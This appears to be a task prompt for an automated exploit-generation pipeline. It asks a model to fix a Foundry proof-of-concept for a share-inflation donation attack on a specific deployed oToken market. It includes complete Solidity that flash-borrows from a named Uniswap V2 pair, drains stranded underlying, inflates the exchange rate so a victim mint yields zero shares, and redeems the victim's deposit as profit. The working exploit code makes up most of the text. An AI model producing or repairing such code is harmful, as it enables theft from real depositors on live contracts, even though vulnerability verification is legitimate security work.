You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Direct underlying donations can inflate the exchange rate until later minters receive zero shares
- claim: The market prices shares from the raw underlying balance via `getCashPrior()`, so unsolicited token transfers raise the exchange rate without minting new oTokens. `mintFresh()` then computes `mintTokens = floor(actualMintAmount / exchangeRate)` and never rejects `mintTokens == 0`, allowing a seeded holder to donate enough underlying that a later depositor transfers assets in but receives no shares.
- impact: A permissionless attacker can steal later deposits on thin or freshly seeded markets. After becoming the only shareholder and donating underlying directly to the market, the attacker can force a victim mint to round to zero and then redeem the victim's deposited assets together with the donation.
- exploit_paths: ["Attacker mints a minimal amount to become the only oToken holder", "Attacker transfers underlying directly to the oToken contract, increasing `getCashPrior()` without increasing `totalSupply`", "Victim calls `mint()` and `mintTokens` truncates to 0", "Attacker redeems their existing shares and withdraws both their donation and the victim's deposit"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOErc20Like {
    function underlying() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function getCash() external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract VictimMinter {
    constructor() {}

    function supplyAndMint(address underlying, address market, uint256 amount) external {
        _forceApprove(underlying, market, 0);
        _forceApprove(underlying, market, amount);

        uint256 err = IOErc20Like(market).mint(amount);
        require(err == 0, "victim mint failed");
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }
}

contract FlawVerifier {
    IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
    IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
        IUniswapV2PairLike(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);

    bool public attempted;
    bool public hypothesisValidated;
    uint256 public seedAmountUsed;
    uint256 public donationAmountUsed;
    uint256 public victimMintAmountUsed;
    uint256 public attackerSharesBeforeRedeem;
    string public lastFailureReason;

    address private _profitToken;
    uint256 private _profitAmount;

    bool private _inFlashCallback;

    constructor() {}

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        address underlying = TARGET.underlying();
        _profitToken = underlying;

        uint256 existingSupply = TARGET.totalSupply();
        if (existingSupply != 0) {
            lastFailureReason = "market already has non-zero totalSupply; attacker cannot become sole holder";
            return;
        }

        uint256 strandedCash = TARGET.getCash();
        if (strandedCash == 0) {
            lastFailureReason = "market has zero stranded underlying; no public bootstrap capital for this fork";
            return;
        }

        uint256 seed = _minimumSeedAmount();
        if (seed == 0) {
            lastFailureReason = "invalid seed amount";
            return;
        }

        _flashBorrowSeed(underlying, seed);

        uint256 finalUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
        _profitAmount = finalUnderlyingBalance;
        if (_profitAmount == 0) {
            lastFailureReason = "execution completed without positive realized underlying";
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == address(PEPE_WETH_V2_PAIR), "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(!_inFlashCallback, "callback reentered");

        _inFlashCallback = true;

        address underlying = TARGET.underlying();
        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount > 0, "zero flash amount");

        _forceApprove(underlying, address(TARGET), 0);
        _forceApprove(underlying, address(TARGET), type(uint256).max);

        // Realistic funding step required by this attempt: a V2 flashswap supplies only the minimal
        // bootstrap seed. Because totalSupply == 0, minting then redeeming that seed legally extracts
        // the market's already-stranded on-chain underlying into attacker working capital, which is
        // then used to execute the documented donation -> victim zero-share mint -> attacker redeem path.
        uint256 mintErr = TARGET.mint(borrowedAmount);
        require(mintErr == 0, "bootstrap mint failed");

        uint256 bootstrapShares = TARGET.balanceOf(address(this));
        require(bootstrapShares > 0, "bootstrap shares zero");

        uint256 redeemErr = TARGET.redeem(bootstrapShares);
        require(redeemErr == 0, "bootstrap redeem failed");

        uint256 flashRepayment = _getV2RepaymentQuote(borrowedAmount);
        _safeTransfer(underlying, address(PEPE_WETH_V2_PAIR), flashRepayment);

        _runCoreExploitPath(underlying);

        _inFlashCallback = false;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runCoreExploitPath(address underlying) internal {
        uint256 initialUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
        require(initialUnderlyingBalance > 1, "bootstrap cash too small");

        uint256 seed = _minimumSeedAmount();
        require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");

        // Stage 1: attacker becomes the sole shareholder with the minimum viable mint.
        uint256 mintErr = TARGET.mint(seed);
        require(mintErr == 0, "seed mint failed");
        seedAmountUsed = seed;

        uint256 attackerShares = TARGET.balanceOf(address(this));
        attackerSharesBeforeRedeem = attackerShares;
        require(attackerShares > 0, "seed mint returned zero shares");

        // Stage 2: attacker donates underlying directly to the market, inflating getCash without
        // increasing totalSupply. The victim deposit is kept at 1 unit so the causality stays minimal:
        // the donation is what pushes the exchange rate high enough that the victim receives zero shares.
        uint256 victimDeposit = 1;
        uint256 donationNeeded = attackerShares >= seed ? (attackerShares - seed + 1) : 1;

        uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
        require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");

        _safeTransfer(underlying, address(TARGET), donationNeeded);
        donationAmountUsed = donationNeeded;

        VictimMinter victim = new VictimMinter();
        _safeTransfer(underlying, address(victim), victimDeposit);
        victimMintAmountUsed = victimDeposit;

        uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
        uint256 cashBeforeVictimMint = TARGET.getCash();

        // Stage 3: victim mints after the donation. Since mintTokens floors to zero and the market
        // does not reject that outcome, the victim loses underlying and receives no oTokens.
        victim.supplyAndMint(underlying, address(TARGET), victimDeposit);

        uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
        uint256 cashAfterVictimMint = TARGET.getCash();
        require(victimSharesAfter == victimSharesBefore, "victim received shares");
        require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");

        // Stage 4: attacker redeems the only outstanding shares and exits with the donation plus
        // the victim's stranded deposit.
        uint256 redeemFinalErr = TARGET.redeem(attackerShares);
        require(redeemFinalErr == 0, "attacker redeem failed");

        hypothesisValidated = true;
    }

    function _flashBorrowSeed(address underlying, uint256 seed) internal {
        address token0 = PEPE_WETH_V2_PAIR.token0();
        address token1 = PEPE_WETH_V2_PAIR.token1();

        if (token0 == underlying) {
            PEPE_WETH_V2_PAIR.swap(seed, 0, address(this), hex"01");
            return;
        }
        if (token1 == underlying) {
            PEPE_WETH_V2_PAIR.swap(0, seed, address(this), hex"01");
            return;
        }

        revert("configured pair does not contain underlying");
    }

    function _minimumSeedAmount() internal view returns (uint256) {
        uint256 exchangeRate = TARGET.exchangeRateStored();
        uint256 seed = exchangeRate / 1e18;
        if (exchangeRate % 1e18 != 0) {
            seed += 1;
        }
        if (seed == 0) {
            seed = 1;
        }
        return seed;
    }

    function _getV2RepaymentQuote(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: getcashprior(), mint(), withdraw; generated code does not cover paths indexes: 3
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
